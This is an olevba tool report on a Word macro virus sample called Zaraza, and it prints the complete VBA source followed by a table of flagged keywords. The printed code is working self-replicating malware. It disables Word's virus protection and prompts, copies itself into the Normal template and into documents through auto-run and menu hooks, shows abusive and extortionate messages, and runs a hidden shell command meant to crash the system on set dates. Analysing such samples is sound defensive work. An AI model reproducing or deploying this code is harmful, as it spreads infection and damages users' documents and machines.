olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zaraza-6dbd9d48c809488cb7be874926f27d32d57859c1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zaraza-6dbd9d48c809488cb7be874926f27d32d57859c1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO zaraza.bas 
in file: Virus.MSWord.Zaraza-6dbd9d48c809488cb7be874926f27d32d57859c1 - OLE stream: 'Macros/VBA/zaraza'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Version 4.2
Sub zaraza()
 On Error Resume Next
 If (Dir(Word.Application.Path + "\~.~") = "") Then
    Application.Caption = "Mikro Word"
    path_1 = Word.Application.Path + "\~42.drv"
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
       Call expo_
    Set per_1 = NormalTemplate.VBProject.VBComponents
    Set per_2 = ActiveDocument.VBProject.VBComponents
    ActiveDocument.ReadOnlyRecommended = False
        With Dialogs(wdDialogFileSummaryInfo)
          .Author = "Divine Intervention"
          .Comments = "Created by MM (c) 2002" + _
             Chr(13) + "Send message to maxvolnov@inbox.ru" + _
             Chr(13) + "Sorry    :-)"
          .Execute
        End With
    If Left(Date, 5) = "14.12" Or Left(Date, 2) = "31" Or Left(Date, 2) = "30" Then Call zavis
    If NormalTemplate.VBProject.VBComponents.Item("zaraza").Name <> "zaraza" Then NT = True
    If ActiveDocument.VBProject.VBComponents.Item("zaraza").Name <> "zaraza" Then AD = True
    If NT = True And AD = False Then Set imp_ = per_1
    If NT = False And AD = True Then Set imp_ = per_2
       imp_.import path_1
    If AD = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
 End If
End Sub

Sub expo_()
 On Error Resume Next
 ActiveDocument.VBProject.VBComponents("zaraza").Export (Word.Application.Path + "\~42.drv")
End Sub

Sub AutoOpen()
 On Error Resume Next
 Call zaraza
End Sub

Sub AutoNew()
 On Error Resume Next
 Call zaraza
End Sub

Sub AutoClose()
 On Error Resume Next
 Call zaraza
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub FileSave()
    On Error Resume Next
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub


Sub HelpAbout()
 On Error Resume Next
 MsgBox "Fuck You " + Application.UserName + " !!!   This Version - 4.2", , Space(12) & "About  :-)"
End Sub

Sub FileTemplates()
 On Error Resume Next
 Call zaraza
 Call IR_
End Sub

Sub ToolsMacro()
 On Error Resume Next
 Call zaraza
 Call IR_
End Sub

Sub ViewVBCode()
 On Error Resume Next
 Call zaraza
 Call IR_
End Sub

Sub IR_()
 On Error Resume Next
 MsgBox "Вставь 10 гривен в дисковод А:\ , иначе форматирую диск !!!"
 ActiveWindow.Close SaveChanges:=SaveChanges
End Sub

Sub zavis()
 On Error Resume Next
 Dim visim
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
  visim = Shell("con\con", vbHide)
End Sub

' МаЗдАй - жЫв !

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

